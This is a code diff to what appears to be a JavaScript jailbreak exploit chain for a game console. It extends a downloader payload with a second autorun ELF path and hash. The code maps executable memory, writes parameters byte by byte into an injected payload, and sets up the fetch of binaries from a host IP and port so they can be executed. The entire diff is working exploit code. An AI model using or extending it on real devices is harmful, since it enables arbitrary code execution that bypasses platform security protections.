@@ -2435,7 +2435,9 @@ async function attempt(ctx, opts) {
             ip: String(tj.ip || ""),
             port: (tj.port | 0) || 80,
             path: "/jb/host/pkg/ludora.pkg",
-            sha256: String(tj.sha256 || "")
+            sha256: String(tj.sha256 || ""),
+            path2: "/jb/host/autorun/ludora_autorun.elf",
+            sha2562: String(tj.autorun_sha256 || "")
           };
         }
       } catch (e) { /* no site -> test fallback */ }
@@ -2460,8 +2462,8 @@ async function attempt(ctx, opts) {
               && dl[2] === 0x4c && dl[3] === 0x46) {
             c.mark("DOWNLOADER-PAYLOAD", "ELF-rejected");
           } else {
-            // mmap must cover the params area end (0x5000 + 0x28c), page-aligned.
-            const dsz = (DL_PARAMS_OFF + 0x28c + 0xfff) & ~0xfff;
+            // mmap must cover the params area end (0x5000 + 0x4cc), page-aligned.
+            const dsz = (DL_PARAMS_OFF + 0x4cc + 0xfff) & ~0xfff;
             const dm = sc(S.mmap, 0, dsz, 7, 0x1002, -1, 0);
             const dentry = v(dm.lo, dm.hi);
             if (dm.i32 !== -1 && (dentry.hi >>> 0) > 0) {
@@ -2477,11 +2479,14 @@ async function attempt(ctx, opts) {
                 const ip = String(dlp.ip || "");
                 const path = String(dlp.path || "");
                 const sha = String(dlp.sha256 || "");
+                const path2 = String(dlp.path2 || "");
+                const sha2 = String(dlp.sha2562 || "");
                 const port = (dlp.port | 0) & 0xffff;
                 wr4(plus(dentry, DL_PARAMS_OFF + 0x00), DL_PARAMS_MAGIC);
                 wr4(plus(dentry, DL_PARAMS_OFF + 0x04),
                   port | ((ip.length & 0xffff) << 16));
-                wr4(plus(dentry, DL_PARAMS_OFF + 0x08), path.length & 0xffff);
+                wr4(plus(dentry, DL_PARAMS_OFF + 0x08),
+                  (path.length & 0xffff) | ((path2.length & 0xffff) << 16));
                 let k;
                 for (k = 0; k < ip.length; ++k)
                   wr1(plus(dentry, DL_PARAMS_OFF + 0x0c + k), ip.charCodeAt(k) & 0xff);
@@ -2489,6 +2494,10 @@ async function attempt(ctx, opts) {
                   wr1(plus(dentry, DL_PARAMS_OFF + 0x4c + k), path.charCodeAt(k) & 0xff);
                 for (k = 0; k < 64 && k < sha.length; ++k)
                   wr1(plus(dentry, DL_PARAMS_OFF + 0x24c + k), sha.charCodeAt(k) & 0xff);
+                for (k = 0; k < path2.length; ++k)
+                  wr1(plus(dentry, DL_PARAMS_OFF + 0x28c + k), path2.charCodeAt(k) & 0xff);
+                for (k = 0; k < 64 && k < sha2.length; ++k)
+                  wr1(plus(dentry, DL_PARAMS_OFF + 0x48c + k), sha2.charCodeAt(k) & 0xff);
 
                 // Resolve pthread_create the same way loadPayload does: the
                 // 14.00 table blanks the import slot, so fall back to the
